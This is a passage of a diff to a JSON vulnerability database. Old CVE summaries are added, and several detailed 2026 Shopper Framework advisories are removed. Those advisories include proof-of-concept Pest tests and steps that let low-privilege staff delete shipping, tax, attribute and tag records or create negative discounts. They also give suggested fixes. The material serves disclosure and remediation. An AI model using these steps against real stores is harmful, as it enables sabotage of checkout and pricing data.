+        "http://marc.info/?l=ntbugtraq&m=97439568517355&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1029",
+      "summary": "SSH server (sshd2) before 2.0.12 does not properly record login attempts if the connection is closed before the maximum number of tries, allowing a remote attacker to guess the password without showing up in the audit logs.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1999-05-13",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=92663402004280&w=2",
+        "http://www.securityfocus.com/bid/277",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2193",
+        "http://marc.info/?l=bugtraq&m=92663402004280&w=2",
+        "http://www.securityfocus.com/bid/277"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1366",
+      "summary": "Pegasus e-mail client 3.0 and earlier uses weak encryption to store POP3 passwords in the pmail.ini file, which allows local users to easily decrypt the passwords and read e-mail.",
+      "cvssScore": 3.6,
+      "severity": "Low",
+      "published": "1999-05-15",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=92714118829880&w=2",
+        "http://marc.info/?l=bugtraq&m=92714118829880&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0489",
+      "summary": "MSHTML.DLL in Internet Explorer 5.0 allows a remote attacker to paste a file name into the file upload intrinsic control, a variant of \"untrusted scripted paste\" as described in MS:MS98-013.",
+      "cvssScore": 10,
+      "severity": "Critical",
+      "published": "1999-05-17",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-015",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-015"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0660",
+      "summary": "Outlook Web Access (OWA) in Microsoft Exchange 5.5, SP4 and earlier, allows remote attackers to identify valid user email addresses by directly accessing a back-end function that processes the global address list (GAL).",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-10-30",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://support.microsoft.com/support/kb/articles/Q307/1/95.ASP",
+        "http://www.securityfocus.com/bid/3301",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-047",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7089",
+        "http://support.microsoft.com/support/kb/articles/Q307/1/95.ASP"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0662",
+      "summary": "RPC endpoint mapper in Windows NT 4.0 allows remote attackers to cause a denial of service (loss of RPC services) via a malformed request.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2001-10-30",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.ciac.org/ciac/bulletins/l-142.shtml",
+        "http://www.securityfocus.com/bid/3313",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-048",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/7105",
+        "http://www.ciac.org/ciac/bulletins/l-142.shtml"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1206",
+      "summary": "SystemSoft SystemWizard package in HP Pavilion PC with Windows 98, and possibly other platforms and operating systems, installs two ActiveX controls that are marked as safe for scripting, which allows remote attackers to execute arbitrary commands via a malicious web page that references (1) the Launch control, or (2) the RegObj control.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "1999-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=93336970231857&w=2",
+        "http://www.securityfocus.com/bid/555",
+        "http://www.systemsoft.com/l-2/l-3/support-systemwizard.htm",
+        "http://marc.info/?l=bugtraq&m=93336970231857&w=2",
+        "http://www.securityfocus.com/bid/555"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1222",
+      "summary": "Netbt.sys in Windows NT 4.0 allows remote malicious DNS servers to cause a denial of service (crash) by returning 0.0.0.0 as the IP address for a DNS host name lookup.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://support.microsoft.com/support/kb/articles/Q188/5/71.ASP",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3893",
+        "http://support.microsoft.com/support/kb/articles/Q188/5/71.ASP",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/3893"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2001-0089",
+      "summary": "Internet Explorer 5.0 through 5.5 allows remote attackers to read arbitrary files from the client via the INPUT TYPE element in an HTML form, aka the \"File Upload via Form\" vulnerability.",
+      "cvssScore": 2.6,
+      "severity": "Low",
+      "published": "2001-02-16",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-093",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5615",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-093",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5615"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0727",
+      "summary": "A kernel leak in the OpenBSD kernel allows IPsec packets to be sent unencrypted.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-08-06",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.osvdb.org/6127",
+        "http://www.osvdb.org/6127"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1524",
+      "summary": "FlowPoint DSL router firmware versions prior to 3.0.8 allows a remote attacker to exploit a password recovery feature from the network and conduct brute force password guessing, instead of limiting the feature to the serial console port.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1999-08-07",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=93424680430460&w=2",
+        "http://marc.info/?l=bugtraq&m=93424680430460&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0673",
+      "summary": "Buffer overflow in ALMail32 POP3 client via From: or To: headers.",
+      "cvssScore": 5.1,
+      "severity": "Medium",
+      "published": "1999-08-08",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/bid/574",
+        "http://www.securityfocus.com/bid/574"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-0768",
+      "summary": "Microsoft ASP.Net 1.1 allows remote attackers to bypass the Cross-Site Scripting (XSS) and Script Injection protection feature via a null character in the beginning of a tag name.",
       "cvssScore": 6.8,
       "severity": "Medium",
-      "published": "2004-11-23",
+      "published": "2003-09-22",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=107722627800820&w=2",
-        "http://www.securityfocus.com/bid/9700",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15268",
-        "http://marc.info/?l=bugtraq&m=107722627800820&w=2",
-        "http://www.securityfocus.com/bid/9700"
+        "http://marc.info/?l=bugtraq&m=106304326916062&w=2",
+        "http://marc.info/?l=bugtraq&m=106304326916062&w=2"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2001-0147",
-      "summary": "Buffer overflow in Windows 2000 event viewer snap-in allows attackers to execute arbitrary commands via a malformed field that is improperly handled during the detailed view of event records.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-013",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-013"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0152",
-      "summary": "The password protection option for the Compressed Folders feature in Plus! for Windows 98 and Windows Me writes password information to a file, which allows local users to recover the passwords and read the compressed folders.",
-      "cvssScore": 2.1,
-      "severity": "Low",
-      "published": "2001-05-03",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-019",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2001/ms01-019"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2002-0829",
-      "summary": "Integer overflow in the Berkeley Fast File System (FFS) in FreeBSD 4.6.1 RELEASE-p4 and earlier allows local users to access arbitrary file contents within FFS to gain privileges by creating a file that is larger than allowed by the virtual memory system.",
-      "cvssScore": 4.6,
+      "id": "CVE-2003-0769",
+      "summary": "Cross-site scripting (XSS) vulnerability in the ICQ Web Front guestbook (guestbook.html) allows remote attackers to insert arbitrary web script and HTML via the message field.",
+      "cvssScore": 4.3,
       "severity": "Medium",
-      "published": "2002-08-12",
+      "published": "2003-09-22",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=102865404413458&w=2",
-        "http://www.iss.net/security_center/static/9771.php",
-        "http://www.osvdb.org/5073",
-        "http://www.securityfocus.com/bid/5399",
-        "http://marc.info/?l=bugtraq&m=102865404413458&w=2"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2003-0769",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2003-0769"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-56826",
-      "summary": "## Summary\n\nFour Livewire components in the Settings area expose destructive Filament actions (`delete` / `edit`) that perform **no server-side authorization**. Any authenticated user who can reach the Settings pages — i.e. holding only the coarse `access_setting` permission, **without** being an admin and **without** any `delete_*`/`edit_*` permission — can delete tax zones, tax rates, shipping zones, and carrier (shipping-rate) options by invoking the component action directly over the Livewire endpoint.\n\nThese records sit on the storefront checkout path, so deleting them breaks shipping-rate calculation, removes region-scoped payment methods, and corrupts tax resolution at checkout.\n\nThis is inconsistent with the rest of the admin, where destructive actions are gated by granular permissions (e.g. `Settings/Locations/Index` uses `->authorize('delete_inventories')`, and `Order/Detail` gates mutating actions with `edit_orders`).\n\n## Affected components\n\n| Component | File | Unauthorized action |\n|---|---|---|\n| `Settings\\Zones\\ZoneShippingOptions` | `packages/admin/src/Livewire/Components/Settings/Zones/ZoneShippingOptions.php:47` | `delete` ��� `CarrierOption::query()->find($arguments['id'])->delete()` (id is client-supplied) |\n| `Settings\\Zones\\Detail` | `packages/admin/src/Livewire/Components/Settings/Zones/Detail.php:46` | `delete` → `DeleteAction` on the bound `Zone` |\n| `Settings\\Taxes\\Detail` | `packages/admin/src/Livewire/Components/Settings/Taxes/Detail.php:42` | `delete` → `DeleteAction` on the bound `TaxZone` |\n| `Settings\\Taxes\\TaxRates` | `packages/admin/src/Livewire/Components/Settings/Taxes/TaxRates.php:97` | `delete` → `DeleteAction` on a `TaxRate` |\n\nEach file contains **zero** `authorize` calls, and the actions declare neither `->authorize()` nor an enforced `->visible()` guard.\n\n## Details\n\nThe Settings pages mount these as child Livewire components. The parent page authorizes `access_setting` (e.g. `Pages/Settings/Taxes.php:29`), but the child components do not re-check authorization, and their destructive actions carry no `->authorize()`. Because each Livewire component handles its own `/livewire/update` requests, the action executes purely on the page-level `access_setting` gate — there is no per-resource permission, and `delete_zones` / `delete_taxes` permissions are never even generated by the seeder (`packages/admin/database/seeders/PermissionsTableSeeder.php`).\n\n`ZoneShippingOptions::deleteAction()` is the clearest case — it deletes by an id taken straight from the client action arguments with no scoping and no permission check:\n\n```php\n// packages/admin/src/Livewire/Components/Settings/Zones/ZoneShippingOptions.php\npublic function deleteAction(): Action\n{\n    return Action::make('delete')\n        ->requiresConfirmation()\n        // ... no ->authorize(), no ->visible()\n        ->action(function (array $arguments): void {\n            CarrierOption::query()->find($arguments['id'])->delete();   // client-controlled id\n            // ...\n        });\n}\n```\n\n## Proof of Concept\n\nConfirmed with the project's own test harness (Pest + Orchestra Testbench, SQLite) — the real Livewire/Filament code path, executed as a non-admin user holding only `access_setting`.\n\n```php\nuse Livewire\\Livewire;\nuse Shopper\\Core\\Models\\{CarrierOption, Zone};\nuse Shopper\\Livewire\\Components\\Settings\\Zones\\ZoneShippingOptions;\nuse Tests\\Core\\Stubs\\User;\n\nuses(Tests\\Admin\\TestCase::class);\n\nit('low-priv access_setting user deletes a CarrierOption with no authorization', function (): void {\n    $attacker = User::factory()->create();\n    $attacker->givePermissionTo('access_setting');          // NOT admin, NO delete_* permission\n    $this->actingAs($attacker, config('shopper.auth.guard'));\n\n    $zone   = Zone::factory()->create();\n    $option = CarrierOption::factory()->create(['zone_id' => $zone->id]);\n\n    Livewire::test(ZoneShippingOptions::class, ['selectedZoneId' => $zone->id])\n        ->callAction('delete', arguments: ['id' => $option->id]);\n\n    expect(CarrierOption::query()->find($option->id))->toBeNull();   // deleted -> vulnerable\n});\n```\n\nResult:\n\n```\nAttacker: isAdmin()=false, can('access_setting')=true, can('delete_zones')=false, can('edit_zones')=false\n[BEFORE] CarrierOption count = 1  (target #1 'DHL Express' exists = YES)\n[ATTACK] callAction('delete', id=1) on ZoneShippingOptions\n[AFTER ] CarrierOption count = 0  (target #1 exists = NO -> deleted)\n\nPASS  3 passed (11 assertions)\n  ✓ CONTROL — Order/Detail::markPaid is correctly hidden without edit_orders (harness enforces declared authz)\n  ✓ a CarrierOption is deleted by the low-priv user\n  ✓ a shipping Zone is deleted by the low-priv user\n```\n\nThe CONTROL case rules out a false positive: the same harness correctly denies `Order/Detail::markPaid` for a user lacking `edit_orders`, proving authorization is enforced when a component declares it — these four components simply declare none.\n\n## Impact\n\nA low-privileged staff member (or a compromised low-privileged account) can sabotage the storefront's checkout/revenue path without any delete permission:\n\n- **Delete a `CarrierOption`** → that shipping rate disappears from checkout for the zone.\n- **Delete a `Zone`** → removes the country → carrier/payment-method/currency mapping; customers shipping to those countries lose all shipping and payment options (`CarrierRateService::getRatesForZone` / `getManualRates` read these directly).\n- **Delete a `TaxZone` / `TaxRate`** → `TaxCalculator::resolveZone()` can no longer resolve the zone, corrupting tax calculation at checkout.\n\nNet effect: integrity and availability damage to live commerce configuration, performed by a principal who was never granted that authority (least-privilege violation).\n\n## Secondary issue found while reproducing\n\n`Zones\\Detail::deleteAction()->after()` calls `$this->reset('zone')`, but `zone` is a `#[Computed]` method (not a property), so it throws `ReflectionException` **after** the row is deleted. Worth fixing alongside the authorization gap.\n\n## Suggested remediation\n\nAdd an authorization check to each action, and ideally a `mount()` guard on each child component, matching the pattern already used in `Settings/Locations/Index.php` and `Team/RolePermission.php`:\n\n```php\npublic function deleteAction(): Action\n{\n    return Action::make('delete')\n        ->authorize('access_setting')   // or a new granular delete_zones / delete_taxes permission\n        ->requiresConfirmation()\n        // ...\n}\n```\n\nApply to the `delete` (and `edit`) actions in all four components. Consider also generating granular `*_zones` / `*_taxes` permissions so settings access can follow least privilege, and fix the `$this->reset('zone')` call in `Zones\\Detail`.",
-      "cvssScore": 5.4,
-      "severity": "Medium",
-      "published": "2026-09-11",
-      "modified": "2026-09-11",
-      "cwe": {
-        "cwe_id": "CWE-862",
-        "name": "Missing Authorization"
-      },
-      "references": [
-        "https://github.com/shopperlabs/shopper/security/advisories/GHSA-f7h9-qv4x-9x57",
-        "https://github.com/advisories/GHSA-f7h9-qv4x-9x57"
-      ],
-      "vulnerableProducts": [
-        "shopper/framework composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-56831",
-      "summary": "## Summary\n\nThe Shopper Framework discount management functionality accepts negative discount values without server-side validation.\n\nIt was confirmed that negative fixed-amount discounts can be created through the administrative interface, persisted to the database, and subsequently processed by the cart/order calculation pipeline.\n\nThe application appears to assume that discount values are always positive but does not enforce this assumption during creation, storage, or calculation.\n\nAs a result, malformed discount records can influence financial calculations and produce unintended order totals.\n\n## Affected Product\n\n**Package:** shopper/framework\n\n**Version Tested:** 2.8.1\n\n## Vulnerability Type\n\n* Business Logic Vulnerability\n* Improper Input Validation (CWE-20)\n\n## Description\n\nWhile reviewing the discount functionality, it was discovered that the application accepts negative discount values through the administrative interface.\n\nExample values tested:\n\n```text\n-50.00\n-99,999,999.00\n```\n\nThe application accepted these values without validation and stored them in the database.\n\nExample records observed in the `sh_discounts` table:\n\n```text\n1 | QCZ5Y3HESM | fixed_amount | -5000\n4 | TOZKAHCB4S | fixed_amount | -9999999900\n```\n\nThis demonstrates that negative discount values are successfully persisted.\n\n## Steps to Reproduce\n\n### 1. Create a Discount\n\nLogin as an administrator.\n\nNavigate to:\n\n```text\n/cpanel/discounts\n```\n\nCreate a new discount with the following values:\n\n```text\nType: fixed_amount\nValue: -99999999\n```\n\nSave the discount.\n\n### 2. Observe Successful Creation\n\nThe discount is accepted by the application and displayed in the administration interface.\n\nExample:\n\n```text\nCode: TOZKAHCB4S\nAmount: -$99,999,999.00\n```\n\n### 3. Verify Database Persistence\n\nInspect the database:\n\n```sql\nselect * from sh_discounts;\n```\n\nObserved entry:\n\n```text\nTOZKAHCB4S | fixed_amount | -9999999900\n```\n\n## Technical Analysis\n\n### Discount Calculation\n\nFile:\n\n```text\nvendor/shopper/cart/src/Discounts/DiscountCalculator.php\n```\n\nObserved code:\n\n```php\n$fixedAmount = $discount->value;\n```\n\nThe value is later processed without validation:\n\n```php\n$fixedAmount = min($fixedAmount, $applicableSubtotal);\n```\n\nWhen a negative value is supplied:\n\n```php\nmin(-9999999900, 10000)\n```\n\nreturns:\n\n```php\n-9999999900\n```\n\nallowing the negative value to continue through the calculation pipeline.\n\nThe resulting adjustment values are inserted into the database:\n\n```php\nCartLineAdjustment::query()->insert($adjustments);\n```\n\nNo validation was identified to ensure that discount amounts are positive before calculations occur.\n\n### Final Total Calculation\n\nFile:\n\n```text\nvendor/shopper/cart/src/Pipelines/Calculate.php\n```\n\nObserved logic:\n\n```php\n$context->total = max(\n    0,\n    $context->taxInclusive\n        ? $context->subtotal - $context->discountTotal\n        : $context->subtotal - $context->discountTotal + $context->taxTotal\n);\n```\n\nBecause negative discount values are allowed to reach this stage, financial calculations are performed using malformed discount data.\n\nExample:\n\n```text\nSubtotal      = 10000\nDiscountTotal = -5000\n```\n\nResulting calculation:\n\n```text\n10000 - (-5000)\n```\n\nResult:\n\n```text\n15000\n```\n\nThis demonstrates that negative discount values directly affect order total calculations.\n\n## Impact\n\nThe following was confirmed:\n\n* Negative discount values are accepted.\n* Negative discount values are persisted.\n* Negative discount values are processed by the discount calculation engine.\n* Negative discount values affect order total calculations.\n\nPotential consequences include:\n\n* Incorrect pricing calculations.\n* Financial data integrity issues.\n* Unexpected order totals.\n* Violated assumptions within downstream pricing logic.\n* Future vulnerabilities if additional components assume discount values are always positive.\n\nBecause Shopper is a headless e-commerce administration framework and does not ship with a customer-facing storefront, it was not verified a customer-facing exploitation path.\n\nHowever, malformed discount records currently propagate through pricing calculations without validation.\n\n## Recommendation\n\nImplement server-side validation enforcing positive discount values before persistence and before entering the calculation pipeline.\n\nSuggested validation:\n\n### Fixed Amount Discounts\n\n```text\nvalue > 0\n```\n\n### Percentage Discounts\n\n```text\n0 < value <= 100\n```\n\nAdditionally, existing discount records should be validated before calculation to prevent malformed data from influencing pricing logic.\n\n## Environment\n\n```text\nShopper Framework 2.8.1\nLaravel 12.61.1\nPHP 8.4.16\nSQLite\n```",
-      "cvssScore": 6.5,
-      "severity": "Medium",
-      "published": "2026-09-11",
-      "modified": "2026-09-11",
-      "cwe": {
-        "cwe_id": "CWE-20",
-        "name": "Improper Input Validation"
-      },
-      "references": [
-        "https://github.com/shopperlabs/shopper/security/advisories/GHSA-5vf4-452p-jjhf",
-        "https://github.com/advisories/GHSA-5vf4-452p-jjhf"
-      ],
-      "vulnerableProducts": [
-        "shopper/framework composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-56827",
-      "summary": "## Summary\n\nFive Filament `groupedBulkActions` blocks across the Shopper admin Livewire pages omit the `->authorize(...)` permission gate, while their per-record sibling actions (and other Shopper Index pages such as `Pages/Settings/Currencies.php`, `Pages/Reviews/Index.php`, `Pages/Collection/Index.php`, and `Pages/Discount/Index.php`) correctly chain `->authorize(...)`. Each affected page's `mount()` only requires the read-only `browse_*` permission, so a low-privilege staff user holding only the read permission can drive the bulk endpoint via the standard Livewire `callTableBulkAction` flow and execute state-mutating operations they were never granted. The vulnerability is the same class as GHSA-f946-9qp6-vgch and GHSA-j328-xmgp-j4q3 (read-only permission gating a write action), just on a different surface (Filament 4 `groupedBulkActions` rather than top-level Livewire methods).\n\nA staff user holding only `browse_attributes` can permanently delete every product attribute in the catalog (cascading break of every dependent product variant). A user holding only `browse_tags` can permanently delete every product tag. Users holding `browse_brands`, `browse_categories`, or `browse_suppliers` can flip the visibility (`is_enabled`) of every brand/category/supplier in bulk, sabotaging storefront catalog visibility.\n\nCVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` = 8.1 High. CWE-285 (Improper Authorization) and CWE-862 (Missing Authorization). The attacker has low privilege (browse-only staff role), no user interaction, network reachable.\n\n## Vulnerable components (paths relative to repo root)\n\nAll references are HEAD = commit `ac9a760` on `master` (the very commit that closed the previous wave of authorization-drift bugs from GHSA-j328-xmgp-j4q3).\n\n### 1) `packages/admin/src/Livewire/Pages/Attribute/Browse.php`\n\nMount at line 36–39 requires only `browse_attributes`.\n\n- Lines 106–122: `DeleteBulkAction::make()` has NO `->authorize(...)` chain (the surrounding per-record `delete` action at lines 95–104 correctly does `->authorize('delete_attributes')`).\n- Lines 123–138: `BulkAction::make('enabled')` has NO `->authorize(...)`.\n- Lines 139–155: `BulkAction::make('disabled')` has NO `->authorize(...)`.\n\nNet effect: a `browse_attributes`-only user can **delete every row in the attributes table**, and toggle `is_enabled` on every attribute in one request. Deleting an attribute cascades into every product variant that references it via the `attribute_product` pivot.\n\n### 2) `packages/admin/src/Livewire/Pages/Tag/Index.php`\n\nMount at line 39 requires only `browse_tags`.\n\n- Lines 96–108: `DeleteBulkAction::make()` has NO `->authorize(...)` chain (the per-record `delete` action at lines 79–94 correctly does `->authorize('delete_tags')`).\n\nNet effect: a `browse_tags`-only user can delete every `ProductTag` row.\n\n### 3) `packages/admin/src/Livewire/Pages/Brand/Index.php`\n\nMount at line 37–40 requires only `browse_brands`.\n\n- Lines 97–112: `BulkAction::make('enabled')` has NO `->authorize(...)`.\n- Lines 113–129: `BulkAction::make('disabled')` has NO `->authorize(...)`.\n\nNet effect: a `browse_brands`-only user can flip `is_enabled` on every brand. Disabling all brands removes them from the storefront catalog. The per-record edit/delete actions and the `DeleteBulkAction` at lines 130–148 are correctly `->authorize(...)` gated — only the visibility bulk actions were missed.\n\n### 4) `packages/admin/src/Livewire/Pages/Category/Index.php`\n\nMount at line 38–41 requires only `browse_categories`.\n\n- Lines 102–117: `BulkAction::make('enabled')` has NO `->authorize(...)`.\n- Lines 118–133: `BulkAction::make('disabled')` has NO `->authorize(...)`.\n\nNet effect: a `browse_categories`-only user can flip `is_enabled` on every category. Same shape as Brand.\n\n### 5) `packages/admin/src/Livewire/Pages/Supplier/Index.php`\n\nMount at line 38 requires only `browse_suppliers`.\n\n- Lines 93–108: `BulkAction::make('enabled')` has NO `->authorize(...)`.\n- Lines 109–125: `BulkAction::make('disabled')` has NO `->authorize(...)`.\n\nNet effect: a `browse_suppliers`-only user can flip `is_enabled` on every supplier.\n\n## Reference comparison: places that ARE correctly gated\n\nFor reference, here is what the same pattern looks like in files that DID get the fix:\n\n- `packages/admin/src/Livewire/Pages/Settings/Currencies.php` lines 90–129: every `BulkAction` chains `->authorize('access_setting')`.\n- `packages/admin/src/Livewire/Pages/Reviews/Index.php` lines 105–119: `DeleteBulkAction` chains `->authorize('delete_reviews')`.\n- `packages/admin/src/Livewire/Pages/Collection/Index.php` lines 109–128: `DeleteBulkAction` chains `->authorize('delete_collections')`.\n- `packages/admin/src/Livewire/Pages/Discount/Index.php` lines 126���145: `DeleteBulkAction` chains `->authorize('delete_discounts')`.\n\nThe convention is established and applied elsewhere — these five files just missed it.\n\n## Proof of Concept\n\nThe attached file `tests/Admin/Livewire/Pages/Brand/AuthBypassPocTest.php` (added in this report) contains seven Pest tests, each acting as a `browse_*`-only staff user and invoking the bulk endpoint. All seven pass on master @ `ac9a760`:\n\n```\n   PASS  Tests\\Admin\\Livewire\\Pages\\Brand\\AuthBypassPocTest\n  ✓ it SHOPPER-2 PoC: read-only viewer can mass-DISABLE all brands via unguarded BulkAction\n  ✓ it SHOPPER-2 PoC: read-only viewer can mass-ENABLE all brands via unguarded BulkAction\n  ✓ it SHOPPER-2 PoC: read-only viewer can mass-DISABLE all categories via unguarded BulkAction\n  ✓ it SHOPPER-2 PoC: read-only viewer can mass-DISABLE all suppliers via unguarded BulkAction\n  ✓ it SHOPPER-2 PoC: read-only viewer can DELETE all attributes via unguarded DeleteBulkAction\n  ✓ it SHOPPER-2 PoC: read-only viewer can mass-DISABLE all attributes via unguarded BulkAction\n  ✓ it SHOPPER-2 PoC: browse_tags viewer can DELETE all product tags via unguarded DeleteBulkAction\n\n  Tests:    7 passed (32 assertions)\n```\n\nEach test seeds three records, signs in a user holding only the corresponding `browse_*` permission, calls `Livewire::test(<Page>::class)->callTableBulkAction(...)`, and asserts the side effect (records flipped or deleted). For example, the attribute mass-delete test:\n\n```php\n$this->viewer = User::factory()->create();\n$this->viewer->givePermissionTo('browse_attributes');\n$this->actingAs($this->viewer);\n\nAttribute::factory()->count(3)->create();\nexpect($this->viewer->can('delete_attributes'))->toBeFalse();\n\nLivewire::test(AttributeBrowse::class)\n    ->callTableBulkAction(\\Filament\\Actions\\DeleteBulkAction::class, Attribute::pluck('id')->toArray())\n    ->assertHasNoErrors();\n\nexpect(Attribute::count())->toBe(0);\n```\n\nThe call uses the same `callTableBulkAction` helper Shopper's own test suite uses everywhere, which in turn drives the same Livewire `update` payload the browser would emit — so this is a faithful HTTP-level reproduction.\n\n## Suggested fix\n\nAdd `->authorize(<correct_permission>)` to each of the five vulnerable groups, mirroring the pattern already used elsewhere:\n\n```diff\n // Pages/Attribute/Browse.php\n ->groupedBulkActions([\n     DeleteBulkAction::make()\n+        ->authorize('delete_attributes')\n         ->label(__('shopper::forms.actions.delete'))\n         ->requiresConfirmation()\n         ->action(function (Collection $records): void { /* ... */ }),\n     BulkAction::make('enabled')\n+        ->authorize('edit_attributes')\n         ->label(__('shopper::forms.actions.enable'))\n         ->action(function (Collection $records): void { /* ... */ }),\n     BulkAction::make('disabled')\n+        ->authorize('edit_attributes')\n         ->label(__('shopper::forms.actions.disable'))\n         ->action(function (Collection $records): void { /* ... */ }),\n ])\n```\n\nApply the equivalent change to `Pages/Tag/Index.php` (`delete_tags`), `Pages/Brand/Index.php` (`edit_brands` for enable/disable), `Pages/Category/Index.php` (`edit_categories`), and `Pages/Supplier/Index.php` (`edit_suppliers`).\n\nA regression test for each file (acting as a `browse_*`-only user and expecting `assertHasErrors`/`AuthorizationException`) would lock in the fix, matching the regression tests added for #514.\n\n## Resources\n\n- Prior advisories of the same class (read-only permission gating a write action): GHSA-f946-9qp6-vgch, GHSA-j328-xmgp-j4q3 / GHSA-vw82-3966-f9mr.\n- Same-shape fix: commit `ac9a760` (PR #514). Five Filament bulk-action groups did not receive the corresponding `->authorize(...)` chain.\n- CWE-285 Improper Authorization, CWE-862 Missing Authorization.\n\n### Credits\n\nReported by Vishal Shukla(@shukla304) using sechub.dev AI Agent\n\n### Support\n\nIf this disclosure was useful and userswould like to support continued open-source security research and responsible-disclosure work, they can sponsor at https://github.com/sponsors/therawdev — Shopper is thankful for those keeping open source safe.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-09-11",
-      "modified": "2026-09-11",
-      "cwe": {
-        "cwe_id": "CWE-862",
-        "name": "Missing Authorization"
-      },
-      "references": [
-        "https://github.com/shopperlabs/shopper/security/advisories/GHSA-243p-f3cv-c5wh",
-        "https://github.com/advisories/GHSA-243p-f3cv-c5wh"
-      ],
-      "vulnerableProducts": [
-        "shopper/framework composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2195",
-      "summary": "PHP remote file inclusion vulnerability in index.php in Zanfi CMS lite 1.1 allows remote attackers to execute arbitrary PHP code via the inc parameter.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://secunia.com/advisories/12792",
-        "http://securitytracker.com/id?1011612",
-        "http://www.osvdb.org/10676",
-        "http://www.securityfocus.com/archive/1/378053",
-        "http://www.securityfocus.com/bid/11362"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-2196",
-      "summary": "Zanfi CMS lite 1.1 allows remote attackers to obtain the full path of the web server via direct requests without required arguments to (1) adm_pages.php, (2) corr_pages.php, (3) del_block.php, (4) del_page.php, (5) footer.php, (6) home.php, and others.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "2004-12-31",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://secunia.com/advisories/12792",
-        "http://securitytracker.com/id?1011612",
-        "http://www.osvdb.org/10677",
-        "http://www.osvdb.org/10678",
-        "http://www.osvdb.org/10679"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0106",
-      "summary": "Finger redirection allows finger bombs.",
